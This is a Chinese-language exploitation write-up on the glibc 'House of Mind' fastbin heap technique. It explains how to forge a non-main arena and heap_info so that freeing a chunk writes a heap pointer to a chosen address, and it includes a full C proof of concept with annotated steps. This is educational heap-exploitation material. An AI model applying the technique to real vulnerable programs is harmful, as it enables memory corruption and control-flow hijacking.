# 漏洞利用文档：house_of_mind_fastbin

## 攻击对象
- **攻击对象**：堆管理结构中的`malloc_state`（arena）的`fastbinsY`数组。具体目标是伪造一个非主竞技场（non-main arena），通过控制`heap_info`结构的`ar_ptr`字段，指向一个用户控制的fake arena。在free操作时，利用fastbin机制将堆块地址写入到fake arena的特定偏移处（例如，对于大小0x60的fastbin chunk，偏移为0x28从arena起始地址）。在提供的调试记录中，`target_loc`地址为`0x603448`（fake_arena `0x603420` + 0x28），这是写入点。

## 利用过程
1. **准备fake arena**：分配一个小堆块（如0x1000字节）作为fake arena，并设置其`system_mem`字段（偏移0x880）为一个较大值（如0xFFFF），以通过size验证。
2. **计算fake_heap_info位置**：基于`HEAP_MAX_SIZE`（0x4000000）对齐，计算fake_heap_info的地址，该地址必须位于堆的HEAP_MAX_SIZE边界。
3. **扩展堆空间**：通过循环分配大堆块（如MAX_SIZE=0x1ff00字节），使堆地址增长到fake_heap_info位置，从而控制该区域。
4. **设置fake_heap_info**：在fake_heap_info处设置`ar_ptr`字段指向fake arena。
5. **分配fastbin chunk**：分配一个fastbin大小的块（如0x50字节，实际大小0x60）。
6. **修改chunk size**：通过单字节溢出，设置chunk的size字段的非主竞技场位（0x4），同时保持原始大小以通过next chunk验证。
7. **触发free**：释放该fastbin chunk，触发`arena_for_chunk`宏使用伪造的arena，导致chunk地址被写入到fake arena的`fastbinsY`数组相应位置。
8. **验证写入**：检查target_loc是否被修改为chunk地址。

## 利用条件
- **堆地址泄露**：需要知道堆的基地址或相关地址，以计算fake_heap_info的位置。在调试中，通过计算得到，但实际利用中可能需要信息泄露。
- **无限分配能力**：能够分配大量堆块（约50次以上）来扩展堆空间到HEAP_MAX_SIZE边界。
- **单字节溢出**：能够覆盖chunk的size字段的一个字节，设置非主竞技场位，且不破坏next chunk的size。
- **fastbin可用**：tcache必须被填满或禁用，确保fastbin被使用。
- **系统内存验证**：fake arena的`system_mem`字段必须大于fastbin chunk size，以通过malloc验证。

## 利用效果
- **任意地址写入**：实现一个受限的write-where primitive，可以将一个堆指针（fastbin chunk地址）写入到可控的地址。这可用于后续攻击，如覆盖函数指针、GOT表等，导致控制流劫持。
- **持久性**：不像unsorted bin攻击那样破坏堆状态，可以多次使用不同大小的fastbin chunk。

## 涉及缓解机制
- **Glibc验证代码**：此利用绕过了一些堆元数据检查，但仍需通过基本验证。相关Glibc源码（版本2.23）如下：
  - `arena_for_chunk`宏（arena.c:127）：
    ```c
    #define arena_for_chunk(ptr) \
      (chunk_non_main_arena(ptr) ? heap_for_ptr(ptr)->ar_ptr : &main_arena)
    ```
    如果chunk是非主竞技场，则使用`heap_for_ptr(ptr)->ar_ptr`。
  - `free`函数中的fastbin处理（malloc.c:1686附近）：在释放fastbin chunk时，会检查chunk size是否在fastbin范围内，并验证next chunk的size：
    ```c
    if (__builtin_expect(chunk_at_offset(p, size)->size <= 2 * SIZE_SZ, 0) ||
        __builtin_expect(chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0)) {
      errstr = "free(): invalid next size (fast)";
      goto errout;
    }
    ```
  - `system_mem`检查：fake arena的`system_mem`必须大于chunk size，否则会失败。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释以解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

int main(){
    printf("House of Mind - Fastbin Variant\n");
    puts("==================================");
    printf("The goal of this technique is to create a fake arena\n");
    printf("at an offset of HEAP_MAX_SIZE\n");
    
    printf("Then, we write to the fastbins when the chunk is freed\n");
    printf("This creates a somewhat constrained WRITE-WHERE primitive\n");
    // 分配信息值
    int HEAP_MAX_SIZE = 0x4000000;
    int MAX_SIZE = (128*1024) - 0x100; // MMap阈值

    printf("Find initial location of the heap\n");
    // 分配fake_arena作为攻击目标
    uint8_t* fake_arena = malloc(0x1000); 
    uint8_t* target_loc = fake_arena + 0x28; // 目标写入地址，fastbinsY偏移

    uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10; // 计算target_chunk用于对齐

    /*
    设置fake arena的system_mem字段（偏移0x880）为一个较大值（0xFFFF），
    以通过chunk size验证。这是因为free时会检查system_mem是否大于chunk size。
    */
    printf("Set 'system_mem' (offset 0x880) for fake arena\n");
    fake_arena[0x880] = 0xFF;
    fake_arena[0x881] = 0xFF; 
    fake_arena[0x882] = 0xFF; 

    printf("Target Memory Address for overwrite: %p\n", target_loc);
    printf("Must set data at HEAP_MAX_SIZE (0x%x) offset\n", HEAP_MAX_SIZE);

    // 计算fake_heap_info的地址，基于HEAP_MAX_SIZE对齐
    uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
    uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

    uint64_t* user_mem = malloc(MAX_SIZE);
    printf("Fake Heap Info struct location: %p\n", fake_heap_info);
    printf("Allocate until we reach a MAX_HEAP_SIZE offset\n");    

    /* 
    循环分配大堆块，直到堆地址达到new_arena_value（HEAP_MAX_SIZE边界），
    这样我们可以控制fake_heap_info区域。
    */
    while((long long)user_mem < new_arena_value){
        user_mem = malloc(MAX_SIZE);
    }

    // 分配一个fastbin大小的chunk（0x50字节，实际大小0x60），作为攻击目标
    printf("Create fastbin sized chunk to be victim of attack\n");
    uint64_t* fastbin_chunk = malloc(0x50); // 大小0x60
    uint64_t* chunk_ptr = fastbin_chunk - 2; // 指向chunk头而不是用户数据
    printf("Fastbin Chunk to overwrite: %p\n", fastbin_chunk);

    /*
    设置fake_heap_info的ar_ptr字段指向fake_arena。
    这是heap_info结构的第一个字段，当chunk被标记为非主竞技场时，
    arena_for_chunk会使用这个ar_ptr。
    */
    printf("Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n", fake_arena);
    fake_heap_info[0] = (uint64_t) fake_arena; // 设置fake ar_ptr
    printf("Target Write at %p prior to exploitation: 0x%x\n", target_loc, *(target_loc));

    /*
    通过单字节溢出修改fastbin chunk的size字段，设置非主竞技场位（0x4），
    同时保持原始大小（0x60）以通过next chunk验证。
    这是漏洞利用的关键：覆盖size字节。
    */
    printf("Set non-main arena bit on the fastbin chunk\n");
    puts("NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n");
    chunk_ptr[1] = 0x60 | 0x4; // 设置非主竞技场位

    // 漏洞利用结束

    /*
    释放fastbin chunk时，arena_for_chunk会使用伪造的arena，
    导致chunk地址被写入到fake_arena的fastbinsY数组偏移0x28处（对于大小0x60）。
    */
    printf("When we free the fastbin chunk with the non-main arena bit\n");
    printf("set, it will cause our fake 'heap_info' struct to be used.\n");
    printf("This will dereference our fake arena location and write\n");
    printf("the address of the heap to an offset of the arena pointer.\n");

    printf("Trigger the magic by freeing the chunk!\n");
    free(fastbin_chunk); // 触发释放，实现写入

    // 验证target_loc是否被写入chunk地址
    printf("Target Write at %p: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
    assert(*((unsigned long *) (target_loc)) != 0); // 确保写入成功
}
```

此PoC演示了如何通过堆扩展、伪造arena和单字节溢出来实现任意地址写入。关键步骤包括堆控制、size修改和free触发。